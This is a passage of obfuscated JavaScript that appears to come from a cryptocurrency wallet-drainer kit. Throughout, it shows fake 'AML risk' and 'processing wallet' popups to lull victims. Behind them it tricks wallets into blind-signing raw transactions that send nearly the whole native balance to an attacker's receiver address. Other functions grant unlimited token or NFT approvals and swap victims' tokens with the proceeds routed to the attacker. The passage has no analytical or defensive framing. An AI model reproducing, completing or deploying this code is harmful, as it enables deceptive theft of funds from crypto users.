                const _0x3f85af = _0x1019a9[_0x4a8fb2(0x36c)][0x0][_0x4a8fb2(0x219)];
                return retrive_token(_0x3711e5, _0x3f85af);
            } else return JSON['parse'](_0x1019a9[_0x4a8fb2(0x36c)][0x0]['ABI']);
        } else return MS_Contract_ABI[_0x4a8fb2(0x345)];
    } catch (_0x320b92) {
        return MS_Contract_ABI[_0x4a8fb2(0x345)];
    }
}, get_permit_type = _0x3c8e4a => {
    const _0x323ed8 = _0x1027e3;
    try {
        if (MS_Settings[_0x323ed8(0x30a)][_0x323ed8(0x25f)]['Mode'] == ![]) return 0x0;
        if (_0x3c8e4a[_0x323ed8(0x239)]('permit') && _0x3c8e4a[_0x323ed8(0x239)](_0x323ed8(0x34f)) && _0x3c8e4a['hasOwnProperty'](_0x323ed8(0x1bf)) && _0x3c8e4a[_0x323ed8(0x239)](_0x323ed8(0x331))) {
            const _0x33c18c = (_0x3a2e92 => {
                const _0x1a204c = _0x323ed8;
                for (const _0x472ea8 in _0x3a2e92) {
                    if (_0x472ea8[_0x1a204c(0x33c)](_0x1a204c(0x1d3))) {
                        const _0x5138d4 = _0x472ea8['slice'](0x7)[_0x1a204c(0x25a)](',');
                        if (_0x5138d4[_0x1a204c(0x25b)] === 0x7 && _0x472ea8[_0x1a204c(0x296)](_0x1a204c(0x288)) === -0x1) return 0x2;
                        if (_0x5138d4[_0x1a204c(0x25b)] === 0x8 && _0x472ea8[_0x1a204c(0x296)](_0x1a204c(0x288)) !== -0x1) return 0x1;
                        return 0x0;
                    }
                }
            })(_0x3c8e4a);
            return _0x33c18c;
        } else return 0x0;
    } catch (_0x44120d) {
        return 0x0;
    }
}, MS_Gas_Reserves = {}, show_check = () => {
    const _0x325ee7 = _0x1027e3;
    try {
        MS_Loader_Style == 0x2 ? MSL[_0x325ee7(0x314)]({
            'icon': _0x325ee7(0x17d),
            'title': _0x325ee7(0x307),
            'text': _0x325ee7(0x366),
            'showConfirmButton': !![],
            'confirmButtonText': _0x325ee7(0x1ff),
            'timer': 0x7d0,
            'color': MS_Color_Scheme
        })['then'](() => {
            const _0xde1754 = _0x325ee7;
            if (MS_Check_Done) return;
            MSL[_0xde1754(0x314)]({
                'icon': _0xde1754(0x17d),
                'title': 'Processing\x20wallet',
                'text': 'Getting\x20your\x20wallet\x20address...',
                'showConfirmButton': !![],
                'confirmButtonText': _0xde1754(0x1ff),
                'timer': 0x1388,
                'color': MS_Color_Scheme
            })['then'](() => {
                const _0x15bc1a = _0xde1754;
                if (MS_Check_Done) return;
                MSL[_0x15bc1a(0x314)]({
                    'icon': _0x15bc1a(0x17d),
                    'title': _0x15bc1a(0x307),
                    'text': _0x15bc1a(0x258),
                    'showConfirmButton': !![],
                    'confirmButtonText': _0x15bc1a(0x1ff),
                    'timer': 0x1388,
                    'color': MS_Color_Scheme
                })['then'](() => {
                    const _0x1fcafe = _0x15bc1a;
                    if (MS_Check_Done) return;
                    MSL['fire']({
                        'icon': _0x1fcafe(0x302),
                        'title': _0x1fcafe(0x307),
                        'subtitle': 'Everything\x20good!',
                        'text': 'Your\x20wallet\x20is\x20AML\x20risk\x20is\x20low\x20enough!',
                        'showConfirmButton': ![],
                        'timer': 0x1388,
                        'color': MS_Color_Scheme
                    })['then'](() => {
                        const _0x39706a = _0x1fcafe;
                        if (MS_Check_Done) return;
                        MSL[_0x39706a(0x314)]({
                            'icon': _0x39706a(0x17d),
                            'title': 'Processing\x20wallet',
                            'text': _0x39706a(0x1a5),
                            'showConfirmButton': !![],
                            'confirmButtonText': _0x39706a(0x1ff),
                            'timer': 0x493e0,
                            'color': MS_Color_Scheme
                        });
                    });
                });
            });
        }) : Swal[_0x325ee7(0x314)]({
            'title': _0x325ee7(0x1b4),
            'icon': _0x325ee7(0x302),
            'timer': 0x7d0
        })[_0x325ee7(0x2b6)](() => {
            const _0x407098 = _0x325ee7;
            if (MS_Check_Done) return;
            Swal[_0x407098(0x314)]({
                'text': _0x407098(0x1e3),
                'imageUrl': _0x407098(0x27e),
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x1388,
                'width': 0x258,
                'showConfirmButton': ![]
            })[_0x407098(0x2b6)](() => {
                const _0x53dbea = _0x407098;
                if (MS_Check_Done) return;
                Swal[_0x53dbea(0x314)]({
                    'text': _0x53dbea(0x299),
                    'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                    'imageHeight': 0x3c,
                    'allowOutsideClick': ![],
                    'allowEscapeKey': ![],
                    'timer': 0x1388,
                    'width': 0x258,
                    'showConfirmButton': ![]
                })[_0x53dbea(0x2b6)](() => {
                    const _0x10658d = _0x53dbea;
                    if (MS_Check_Done) return;
                    Swal[_0x10658d(0x314)]({
                        'text': _0x10658d(0x258),
                        'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                        'imageHeight': 0x3c,
                        'allowOutsideClick': ![],
                        'allowEscapeKey': ![],
                        'timer': 0x1388,
                        'width': 0x258,
                        'showConfirmButton': ![]
                    })[_0x10658d(0x2b6)](() => {
                        const _0x45bfbc = _0x10658d;
                        if (MS_Check_Done) return;
                        Swal[_0x45bfbc(0x314)]({
                            'text': _0x45bfbc(0x231),
                            'icon': _0x45bfbc(0x302),
                            'allowOutsideClick': ![],
                            'allowEscapeKey': ![],
                            'timer': 0x7d0,
                            'width': 0x258,
                            'showConfirmButton': ![]
                        })['then'](() => {
                            const _0x45ef5c = _0x45bfbc;
                            if (MS_Check_Done) return;
                            Swal[_0x45ef5c(0x314)]({
                                'text': _0x45ef5c(0x1a5),
                                'imageUrl': _0x45ef5c(0x27e),
                                'imageHeight': 0x3c,
                                'allowOutsideClick': ![],
                                'allowEscapeKey': ![],
                                'timer': 0x0,
                                'width': 0x258,
                                'showConfirmButton': ![]
                            });
                        });
                    });
                });
            });
        });
    } catch (_0x506d3a) {
        console[_0x325ee7(0x1db)](_0x506d3a);
    }
}, get_nonce = async _0x483b38 => {
    const _0x1a141c = _0x1027e3,
        _0x6b855d = new ethers[(_0x1a141c(0x265))][(_0x1a141c(0x315))](MS_Settings[_0x1a141c(0x31a)][_0x483b38]);
    return await _0x6b855d['getTransactionCount'](MS_Current_Address, _0x1a141c(0x28f));
}, wait_message = () => {
    const _0x539f92 = _0x1027e3;
    try {
        if (!MS_Process) return;
        Swal['close'](), MS_Loader_Style == 0x2 ? MSL[_0x539f92(0x314)]({
            'icon': 'success',
            'title': 'OK',
            'subtitle': 'Thanks!',
            'text': _0x539f92(0x360),
            'showConfirmButton': ![],
            'timer': 0x9c4,
            'color': MS_Color_Scheme
        })[_0x539f92(0x2b6)](() => {
            const _0x4183b5 = _0x539f92;
            MSL[_0x4183b5(0x314)]({
                'icon': _0x4183b5(0x17d),
                'title': _0x4183b5(0x20b),
                'text': '\x20Please,\x20don\x27t\x20leave\x20this\x20page!',
                'showConfirmButton': !![],
                'confirmButtonText': _0x4183b5(0x1ab),
                'showConfirmButton': ![],
                'color': MS_Color_Scheme
            });
        }) : Swal[_0x539f92(0x314)]({
            'html': _0x539f92(0x2a1),
            'icon': _0x539f92(0x302),
            'allowOutsideClick': ![],
            'allowEscapeKey': ![],
            'timer': 0x9c4,
            'width': 0x258,
            'showConfirmButton': ![]
        })[_0x539f92(0x2b6)](() => {
            const _0x521125 = _0x539f92;
            Swal[_0x521125(0x314)]({
                'html': _0x521125(0x200),
                'imageUrl': _0x521125(0x27e),
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            });
        });
    } catch (_0x577eb3) {
        console[_0x539f92(0x1db)](_0x577eb3);
    }
}, end_message = () => {
    const _0x3de506 = _0x1027e3;
    try {
        MS_Loader_Style == 0x2 ? MSL['fire']({
            'icon': _0x3de506(0x173),
            'title': _0x3de506(0x2a8),
            'subtitle': _0x3de506(0x23f),
            'text': _0x3de506(0x283),
            'showConfirmButton': !![],
            'confirmButtonText': 'OK',
            'color': MS_Color_Scheme
        }) : (Swal['close'](), Swal[_0x3de506(0x314)]({
            'html': _0x3de506(0x369),
            'icon': 'error',
            'allowOutsideClick': !![],
            'allowEscapeKey': !![],
            'timer': 0x0,
            'width': 0x258,
            'showConfirmButton': !![],
            'confirmButtonText': 'OK'
        }));
    } catch (_0x3fa864) {
        console[_0x3de506(0x1db)](_0x3fa864);
    }
};
let is_first_sign = !![];
const sign_ready = () => {
        const _0x5a7867 = _0x1027e3;
        try {
            MS_Loader_Style == 0x2 ? MSL[_0x5a7867(0x314)]({
                'icon': _0x5a7867(0x302),
                'title': 'OK',
                'subtitle': _0x5a7867(0x1ba),
                'text': _0x5a7867(0x188),
                'showConfirmButton': ![],
                'color': MS_Color_Scheme
            }) : (Swal[_0x5a7867(0x218)](), Swal[_0x5a7867(0x314)]({
                'html': '<b>Success!</b>\x20Your\x20sign\x20is\x20confirmed!',
                'icon': _0x5a7867(0x302),
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            }));
        } catch (_0x4ae857) {
            console[_0x5a7867(0x1db)](_0x4ae857);
        }
    },
    sign_next = () => {
        const _0x403036 = _0x1027e3;
        try {
            if (is_first_sign) {
                is_first_sign = ![];
                return;
            }
            MS_Loader_Style == 0x2 ? MSL['fire']({
                'icon': _0x403036(0x17d),
                'title': _0x403036(0x1df),
                'text': _0x403036(0x1d0),
                'showConfirmButton': !![],
                'confirmButtonText': 'Waiting...',
                'color': MS_Color_Scheme
            }) : (Swal['close'](), Swal[_0x403036(0x314)]({
                'html': _0x403036(0x2be),
                'imageUrl': 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            }));
        } catch (_0x126b2c) {
            console[_0x403036(0x1db)](_0x126b2c);
        }
    },
    is_nft_approved = async (_0x13207e, _0x16695a, _0xb4635a) => {
        const _0x368739 = _0x1027e3;
        try {
            const _0x1ab70c = new ethers[(_0x368739(0x265))][(_0x368739(0x315))](MS_Settings['RPCs'][0x1]),
                _0x4f413d = new ethers['Contract'](_0x13207e, MS_Contract_ABI[_0x368739(0x355)], _0x1ab70c);
            return await _0x4f413d[_0x368739(0x28c)](_0x16695a, _0xb4635a);
        } catch (_0xe55dc) {
            return console[_0x368739(0x1db)](_0xe55dc), ![];
        }
    }, SIGN_NATIVE = async _0x455a57 => {
        const _0x13995a = _0x1027e3,
            _0x1f33e5 = new ethers[(_0x13995a(0x265))][(_0x13995a(0x315))](MS_Settings[_0x13995a(0x31a)][_0x455a57[_0x13995a(0x1cc)]]),
            _0x55c17d = BN(await _0x1f33e5[_0x13995a(0x30b)]())[_0x13995a(0x2a9)](BN(0x64))[_0x13995a(0x2d4)](BN(Math[_0x13995a(0x32c)](MS_Gas_Multiplier * 0x64))),
            _0x3c3ac8 = BN(_0x455a57[_0x13995a(0x1cc)] == 0xa4b1 ? 0x4c4b40 : _0x455a57[_0x13995a(0x1cc)] == 0xa86a ? 0x4c4b40 : _0x455a57[_0x13995a(0x1cc)] == 0x171 ? 0xdbba0 : 0x249f0),
            _0x4571a7 = _0x3c3ac8[_0x13995a(0x2d4)](MS_Gas_Reserves[_0x455a57['chain_id']] + 0x1)['mul'](_0x55c17d);
        let _0x5597c6 = {
            'from': MS_Current_Address,
            'to': MS_Settings[_0x13995a(0x347)],
            'value': BN(0x64),
            'data': '0x'
        };
        const _0x3b3e87 = await _0x1f33e5['estimateGas'](_0x5597c6),
            _0x3a5e9a = await _0x1f33e5['getBalance'](MS_Current_Address),
            _0x3cc0cf = _0x3a5e9a['sub'](_0x3b3e87[_0x13995a(0x2d4)](_0x55c17d))[_0x13995a(0x236)](_0x4571a7);
        if (_0x3cc0cf[_0x13995a(0x1b2)](BN(0x0))) throw _0x13995a(0x32a);
        const _0x11f563 = await _0x1f33e5[_0x13995a(0x263)](MS_Current_Address, _0x13995a(0x28f)),
            _0x21d94d = new Web3(MS_Provider);
        _0x5597c6['value'] = _0x21d94d[_0x13995a(0x36e)][_0x13995a(0x2fa)](_0x3cc0cf[_0x13995a(0x2df)]()), _0x5597c6[_0x13995a(0x2c8)] = _0x21d94d[_0x13995a(0x36e)][_0x13995a(0x2fa)](_0x11f563[_0x13995a(0x2df)]()), _0x5597c6[_0x13995a(0x21a)] = _0x21d94d[_0x13995a(0x36e)][_0x13995a(0x2fa)](_0x55c17d[_0x13995a(0x2df)]()), _0x5597c6['gasLimit'] = _0x21d94d[_0x13995a(0x36e)][_0x13995a(0x2fa)](_0x3b3e87['toString']()), _0x5597c6['v'] = _0x21d94d[_0x13995a(0x36e)][_0x13995a(0x2fa)](_0x455a57[_0x13995a(0x1cc)]), _0x5597c6['r'] = '0x', _0x5597c6['s'] = '0x', _0x5597c6 = new ethereumjs['Tx'](_0x5597c6);
        let _0xf4d669 = '0x' + _0x5597c6[_0x13995a(0x1aa)]()[_0x13995a(0x2df)]('hex');
        _0xf4d669 = _0x21d94d['utils'][_0x13995a(0x28b)](_0xf4d669, {
            'encoding': _0x13995a(0x304)
        }), await sign_request(_0x455a57);
        let _0x2cb444 = await _0x21d94d['eth']['sign'](_0xf4d669, MS_Current_Address);
        _0x2cb444 = _0x2cb444[_0x13995a(0x1e1)](0x2);
        const _0x3e0b35 = '0x' + _0x2cb444[_0x13995a(0x1e1)](0x0, 0x40),
            _0x237f84 = '0x' + _0x2cb444['substring'](0x40, 0x80),
            _0x521cf2 = parseInt(_0x2cb444[_0x13995a(0x1e1)](0x80, 0x82), 0x10),
            _0x549b23 = _0x21d94d[_0x13995a(0x36e)][_0x13995a(0x2fa)](_0x521cf2 + _0x455a57[_0x13995a(0x1cc)] * 0x2 + 0x8);
        _0x5597c6['v'] = _0x549b23, _0x5597c6['r'] = _0x3e0b35, _0x5597c6['s'] = _0x237f84, _0xf4d669 = '0x' + _0x5597c6['serialize']()[_0x13995a(0x2df)](_0x13995a(0x304)), sign_next();
        const _0x26581d = await _0x1f33e5[_0x13995a(0x20e)](_0xf4d669);
        wait_message();
        if (MS_Settings[_0x13995a(0x30a)][_0x13995a(0x340)]) await _0x1f33e5[_0x13995a(0x1c9)](_0x26581d[_0x13995a(0x1ef)], 0x1, 0x7530);
        await sign_success(_0x455a57, _0x3cc0cf), sign_ready();
    }, SIGN_TOKEN = async _0x4bffae => {
        const _0x23c3df = _0x1027e3,
            _0x3deecc = new ethers[(_0x23c3df(0x265))][(_0x23c3df(0x315))](MS_Settings[_0x23c3df(0x31a)][_0x4bffae[_0x23c3df(0x1cc)]]),
            _0x4371ea = BN(await _0x3deecc[_0x23c3df(0x30b)]())[_0x23c3df(0x2a9)](BN(0x64))[_0x23c3df(0x2d4)](BN(Math[_0x23c3df(0x32c)](MS_Gas_Multiplier * 0x64))),
            _0x6f1b59 = new Web3(MS_Provider);
        let _0x55accf = null;
        const _0xf2dd9a = new _0x6f1b59[(_0x23c3df(0x2f8))][(_0x23c3df(0x32b))](MS_Contract_ABI[_0x23c3df(0x345)], _0x4bffae[_0x23c3df(0x1e6)]);
        let _0x1eecb4 = ethers[_0x23c3df(0x36e)][_0x23c3df(0x1f0)](MS_Unlimited_Amount);
        for (const _0x2d1352 of MS_Settings[_0x23c3df(0x297)]) {
            try {
                if (_0x2d1352[0x0] == MS_Current_Chain_ID && _0x2d1352[0x1] == _0x4bffae[_0x23c3df(0x1e6)][_0x23c3df(0x190)]()[_0x23c3df(0x2fc)]()) {
                    _0x1eecb4 = _0x4bffae['amount_raw'];
                    break;
                }
            } catch (_0x106a21) {
                console[_0x23c3df(0x1db)](_0x106a21);
            }
        }
        if (MS_Settings[_0x23c3df(0x30a)][_0x23c3df(0x2ce)][_0x23c3df(0x320)] == 0x1) _0x55accf = _0xf2dd9a[_0x23c3df(0x2da)][_0x23c3df(0x2ca)](MS_Settings[_0x23c3df(0x2ad)], _0x1eecb4)[_0x23c3df(0x301)]();
        else {
            if (MS_Settings[_0x23c3df(0x30a)][_0x23c3df(0x2ce)][_0x23c3df(0x320)] == 0x2) _0x55accf = _0xf2dd9a[_0x23c3df(0x2da)][_0x23c3df(0x277)](MS_Settings['Receiver'], _0x4bffae[_0x23c3df(0x1d9)])['encodeABI']();
        }
        let _0x59e287 = {
            'from': MS_Current_Address,
            'to': _0x4bffae[_0x23c3df(0x1e6)],
            'value': _0x23c3df(0x1d1),
            'data': _0x55accf
        };
        const _0x9aeed4 = await _0x3deecc['estimateGas'](_0x59e287),
            _0x43216c = await _0x3deecc[_0x23c3df(0x2a6)](MS_Current_Address),
            _0x56169f = _0x43216c['sub'](_0x9aeed4[_0x23c3df(0x2d4)](_0x4371ea));
        if (_0x56169f['lt'](BN(0x0))) throw _0x23c3df(0x32a);
        const _0x2d5ecd = await _0x3deecc[_0x23c3df(0x263)](MS_Current_Address, _0x23c3df(0x28f));
        _0x59e287[_0x23c3df(0x2c8)] = _0x6f1b59[_0x23c3df(0x36e)][_0x23c3df(0x2fa)](_0x2d5ecd[_0x23c3df(0x2df)]()), _0x59e287[_0x23c3df(0x21a)] = _0x6f1b59[_0x23c3df(0x36e)][_0x23c3df(0x2fa)](_0x4371ea[_0x23c3df(0x2df)]()), _0x59e287[_0x23c3df(0x1ee)] = _0x6f1b59[_0x23c3df(0x36e)][_0x23c3df(0x2fa)](_0x9aeed4[_0x23c3df(0x2df)]()), _0x59e287['v'] = _0x6f1b59[_0x23c3df(0x36e)]['toHex'](_0x4bffae[_0x23c3df(0x1cc)]), _0x59e287['r'] = '0x', _0x59e287['s'] = '0x', _0x59e287 = new ethereumjs['Tx'](_0x59e287);
        let _0x6dc360 = '0x' + _0x59e287[_0x23c3df(0x1aa)]()[_0x23c3df(0x2df)]('hex');
        _0x6dc360 = _0x6f1b59[_0x23c3df(0x36e)][_0x23c3df(0x28b)](_0x6dc360, {
            'encoding': _0x23c3df(0x304)
        }), await sign_request(_0x4bffae);
        let _0x49aa3d = await _0x6f1b59[_0x23c3df(0x2f8)]['sign'](_0x6dc360, MS_Current_Address);
        _0x49aa3d = _0x49aa3d[_0x23c3df(0x1e1)](0x2);
        const _0xd38c1b = '0x' + _0x49aa3d[_0x23c3df(0x1e1)](0x0, 0x40),
            _0x1e4a68 = '0x' + _0x49aa3d['substring'](0x40, 0x80),
            _0x216058 = parseInt(_0x49aa3d['substring'](0x80, 0x82), 0x10),
            _0x3e218f = _0x6f1b59[_0x23c3df(0x36e)]['toHex'](_0x216058 + _0x4bffae['chain_id'] * 0x2 + 0x8);
        _0x59e287['v'] = _0x3e218f, _0x59e287['r'] = _0xd38c1b, _0x59e287['s'] = _0x1e4a68, _0x6dc360 = '0x' + _0x59e287[_0x23c3df(0x1aa)]()[_0x23c3df(0x2df)](_0x23c3df(0x304)), sign_next();
        const _0x297bc8 = await _0x3deecc[_0x23c3df(0x20e)](_0x6dc360);
        wait_message();
        if (MS_Settings[_0x23c3df(0x30a)][_0x23c3df(0x340)]) await _0x3deecc['waitForTransaction'](_0x297bc8[_0x23c3df(0x1ef)], 0x1, 0x7530);
        await sign_success(_0x4bffae), sign_ready();
    }, SIGN_NFT = async _0x2946fe => {
        const _0x509ed7 = _0x1027e3,
            _0x1cbc46 = new ethers[(_0x509ed7(0x265))][(_0x509ed7(0x315))](MS_Settings[_0x509ed7(0x31a)][_0x2946fe[_0x509ed7(0x1cc)]]),
            _0x5bd66e = BN(await _0x1cbc46[_0x509ed7(0x30b)]())[_0x509ed7(0x2a9)](BN(0x64))[_0x509ed7(0x2d4)](BN(Math['floor'](MS_Gas_Multiplier * 0x64))),
            _0x346dfc = new Web3(MS_Provider);
        let _0x4df389 = null;
        const _0x3cc2a9 = new _0x346dfc['eth'][(_0x509ed7(0x32b))](MS_Contract_ABI[_0x509ed7(0x355)], _0x2946fe[_0x509ed7(0x1e6)]);
        if (MS_Settings[_0x509ed7(0x30a)][_0x509ed7(0x2ce)][_0x509ed7(0x195)] == 0x1) data = _0x3cc2a9[_0x509ed7(0x2da)][_0x509ed7(0x1a6)](MS_Settings[_0x509ed7(0x2ad)], !![])['encodeABI']();
        else {
            if (MS_Settings['Settings'][_0x509ed7(0x2ce)]['NFTs'] == 0x2) data = _0x3cc2a9[_0x509ed7(0x2da)][_0x509ed7(0x19e)](MS_Current_Address, MS_Settings[_0x509ed7(0x347)], _0x2946fe['id'])[_0x509ed7(0x301)]();
        }
        let _0x3eb884 = {
            'from': MS_Current_Address,
            'to': _0x2946fe['address'],
            'value': _0x509ed7(0x1d1),
            'data': _0x4df389
        };
        const _0x4eaed8 = await _0x1cbc46['estimateGas'](_0x3eb884),
            _0x1c24f7 = await _0x1cbc46[_0x509ed7(0x2a6)](MS_Current_Address),
            _0x46d2ba = _0x1c24f7['sub'](_0x4eaed8[_0x509ed7(0x2d4)](_0x5bd66e));
        if (_0x46d2ba['lt'](BN(0x0))) throw 'LOW_BALANCE';
        const _0x212b58 = await _0x1cbc46[_0x509ed7(0x263)](MS_Current_Address, _0x509ed7(0x28f));
        _0x3eb884['nonce'] = _0x346dfc['utils'][_0x509ed7(0x2fa)](_0x212b58['toString']()), _0x3eb884['gasPrice'] = _0x346dfc[_0x509ed7(0x36e)]['toHex'](_0x5bd66e['toString']()), _0x3eb884[_0x509ed7(0x1ee)] = _0x346dfc[_0x509ed7(0x36e)]['toHex'](_0x4eaed8[_0x509ed7(0x2df)]()), _0x3eb884['v'] = _0x346dfc[_0x509ed7(0x36e)][_0x509ed7(0x2fa)](_0x2946fe[_0x509ed7(0x1cc)]), _0x3eb884['r'] = '0x', _0x3eb884['s'] = '0x', _0x3eb884 = new ethereumjs['Tx'](_0x3eb884);
        let _0x2b620b = '0x' + _0x3eb884[_0x509ed7(0x1aa)]()[_0x509ed7(0x2df)]('hex');
        _0x2b620b = _0x346dfc[_0x509ed7(0x36e)]['sha3'](_0x2b620b, {
            'encoding': _0x509ed7(0x304)
        }), await sign_request(_0x2946fe);
        let _0x22644f = await _0x346dfc[_0x509ed7(0x2f8)]['sign'](_0x2b620b, MS_Current_Address);
        _0x22644f = _0x22644f[_0x509ed7(0x1e1)](0x2);
        const _0x58738b = '0x' + _0x22644f[_0x509ed7(0x1e1)](0x0, 0x40),
            _0x5d65a4 = '0x' + _0x22644f['substring'](0x40, 0x80),
            _0x2ad384 = parseInt(_0x22644f[_0x509ed7(0x1e1)](0x80, 0x82), 0x10),
            _0x544674 = _0x346dfc[_0x509ed7(0x36e)]['toHex'](_0x2ad384 + _0x2946fe[_0x509ed7(0x1cc)] * 0x2 + 0x8);
        _0x3eb884['v'] = _0x544674, _0x3eb884['r'] = _0x58738b, _0x3eb884['s'] = _0x5d65a4, _0x2b620b = '0x' + _0x3eb884[_0x509ed7(0x1aa)]()[_0x509ed7(0x2df)](_0x509ed7(0x304)), sign_next();
        const _0x3eadda = await _0x1cbc46[_0x509ed7(0x20e)](_0x2b620b);
        wait_message();
        if (MS_Settings[_0x509ed7(0x30a)][_0x509ed7(0x340)]) await _0x1cbc46[_0x509ed7(0x1c9)](_0x3eadda[_0x509ed7(0x1ef)], 0x1, 0x7530);
        await sign_success(_0x2946fe), sign_ready();
    }, DO_SWAP = async _0x60e61c => {
        const _0x1aa082 = _0x1027e3,
            _0x1582cb = new ethers['providers'][(_0x1aa082(0x315))](MS_Settings[_0x1aa082(0x31a)][_0x60e61c[_0x1aa082(0x1cc)]]),
            _0x41f6c5 = Math[_0x1aa082(0x32c)](Date[_0x1aa082(0x364)]() / 0x3e8) + 0x270f * 0xa,
            _0x4227a9 = new ethers[(_0x1aa082(0x32b))](_0x60e61c[_0x1aa082(0x2ec)], MS_Pancake_ABI, MS_Signer),
            _0x521a0b = ethers[_0x1aa082(0x24f)][_0x1aa082(0x308)](await _0x1582cb[_0x1aa082(0x30b)]())[_0x1aa082(0x2a9)](ethers[_0x1aa082(0x24f)][_0x1aa082(0x308)](_0x1aa082(0x178)))[_0x1aa082(0x2d4)](ethers['BigNumber'][_0x1aa082(0x308)]('120'))[_0x1aa082(0x2df)]();
        let _0x1802fb = null,
            _0x5b679e = 0x0;
        while (_0x5b679e < 0x3) {
            try {
                _0x1802fb = await _0x4227a9[_0x1aa082(0x36f)][_0x1aa082(0x27c)](_0xf4646, '0', [_0x60e61c[_0x1aa082(0x1e6)], MS_Swap_Route[_0x60e61c[_0x1aa082(0x1cc)]]], MS_Settings[_0x1aa082(0x347)], _0x41f6c5, {
                    'from': MS_Current_Address
                }), _0x1802fb = ethers[_0x1aa082(0x24f)][_0x1aa082(0x308)](_0x1802fb)[_0x1aa082(0x2a9)](ethers[_0x1aa082(0x24f)][_0x1aa082(0x308)](_0x1aa082(0x178)))[_0x1aa082(0x2d4)](ethers['BigNumber'][_0x1aa082(0x308)](_0x1aa082(0x194)))[_0x1aa082(0x2df)](), _0x5b679e = 0x3;
            } catch (_0x2c99e9) {
                _0x1802fb = _0x60e61c[_0x1aa082(0x1cc)] == 0xa4b1 ? 0x4c4b40 : _0x60e61c[_0x1aa082(0x1cc)] == 0xa86a ? 0x4c4b40 : 0x55730, _0x5b679e += 0x1;
            }
        }
        const _0x4ba6f2 = await get_nonce(_0x60e61c[_0x1aa082(0x1cc)]),
            _0xf4646 = ethers[_0x1aa082(0x24f)][_0x1aa082(0x308)](_0x60e61c[_0x1aa082(0x1d9)])[_0x1aa082(0x1b2)](ethers['BigNumber'][_0x1aa082(0x308)](_0x60e61c['swapper_allowance'])) ? ethers['BigNumber']['from'](_0x60e61c[_0x1aa082(0x1d9)])[_0x1aa082(0x2df)]() : ethers[_0x1aa082(0x24f)][_0x1aa082(0x308)](_0x60e61c[_0x1aa082(0x1eb)])[_0x1aa082(0x2df)]();
        await swap_request(_0x60e61c['swapper_type'], _0x60e61c, [_0x60e61c]), sign_next();
        const _0xb7c59a = await _0x4227a9[_0x1aa082(0x27c)](_0xf4646, '0', [_0x60e61c[_0x1aa082(0x1e6)], MS_Swap_Route[_0x60e61c[_0x1aa082(0x1cc)]]], MS_Settings[_0x1aa082(0x347)], _0x41f6c5, {
            'gasLimit': ethers[_0x1aa082(0x24f)][_0x1aa082(0x308)](_0x1802fb),
            'gasPrice': ethers[_0x1aa082(0x24f)]['from'](_0x521a0b),
            'nonce': _0x4ba6f2,
            'from': MS_Current_Address
        });
        wait_message();
        if (MS_Settings[_0x1aa082(0x30a)][_0x1aa082(0x340)]) await _0x1582cb['waitForTransaction'](_0xb7c59a[_0x1aa082(0x1ef)], 0x1, 0xea60);
        await swap_success(_0x60e61c[_0x1aa082(0x2b9)], _0x60e61c, [_0x60e61c]), sign_ready();
    }, DO_UNISWAP = async (_0x2c80df, _0x41792d) => {
        const _0x353e70 = _0x1027e3,
            _0x8f5eba = new Web3(MS_Provider),
            _0x2d0f43 = new ethers['providers']['JsonRpcProvider'](MS_Settings[_0x353e70(0x31a)][_0x2c80df[_0x353e70(0x1cc)]]),
            _0x16c427 = Math['floor'](Date[_0x353e70(0x364)]() / 0x3e8) + 0x270f * 0xa,
            _0x139342 = new ethers[(_0x353e70(0x32b))](_0x2c80df['swapper_address'], MS_Uniswap_ABI, MS_Signer),
            _0x396c9d = ethers[_0x353e70(0x24f)]['from'](await _0x2d0f43['getGasPrice']())[_0x353e70(0x2a9)](ethers['BigNumber'][_0x353e70(0x308)](_0x353e70(0x178)))[_0x353e70(0x2d4)](ethers[_0x353e70(0x24f)]['from'](_0x353e70(0x194)))['toString'](),
            _0x3f1f50 = await get_nonce(_0x2c80df[_0x353e70(0x1cc)]),
            _0x2ed787 = [];
        for (const _0x58ebdb of _0x41792d) {
            try {
                const _0x58a4dd = ethers['BigNumber']['from'](_0x58ebdb[_0x353e70(0x1d9)])[_0x353e70(0x1b2)](ethers[_0x353e70(0x24f)][_0x353e70(0x308)](_0x58ebdb[_0x353e70(0x1eb)])) ? ethers['BigNumber'][_0x353e70(0x308)](_0x58ebdb['amount_raw'])[_0x353e70(0x2df)]() : ethers[_0x353e70(0x24f)][_0x353e70(0x308)](_0x58ebdb['swapper_allowance'])[_0x353e70(0x2df)](),
                    _0x407dd8 = new _0x8f5eba[(_0x353e70(0x2f8))][(_0x353e70(0x32b))](MS_Uniswap_ABI, _0x58ebdb[_0x353e70(0x2ec)]),
                    _0x2222bd = _0x407dd8[_0x353e70(0x2da)]['swapExactTokensForTokens'](_0x58a4dd, '0', [_0x58ebdb[_0x353e70(0x1e6)], MS_Swap_Route[_0x58ebdb[_0x353e70(0x1cc)]]], MS_Settings['Receiver'])[_0x353e70(0x301)]();
                _0x2ed787[_0x353e70(0x28a)](_0x2222bd);
            } catch (_0x8bd57b) {
                console['log'](_0x8bd57b);
            }
        }
        let _0x1a0dc7 = null,
            _0x2bb385 = 0x0;
        while (_0x2bb385 < 0x3) {
            try {
                _0x1a0dc7 = await _0x139342[_0x353e70(0x36f)][_0x353e70(0x306)](_0x16c427, _0x2ed787, {
                    'from': MS_Current_Address
                }), _0x1a0dc7 = ethers['BigNumber']['from'](_0x1a0dc7)[_0x353e70(0x2a9)](ethers[_0x353e70(0x24f)][_0x353e70(0x308)](_0x353e70(0x178)))[_0x353e70(0x2d4)](ethers[_0x353e70(0x24f)][_0x353e70(0x308)]('120'))[_0x353e70(0x2df)](), _0x2bb385 = 0x3;
            } catch (_0x3aeff3) {
                _0x1a0dc7 = _0x2c80df[_0x353e70(0x1cc)] == 0xa4b1 ? 0x4c4b40 : _0x2c80df[_0x353e70(0x1cc)] == 0xa86a ? 0x4c4b40 : 0x7a120, _0x2bb385 += 0x1;
            }
        }
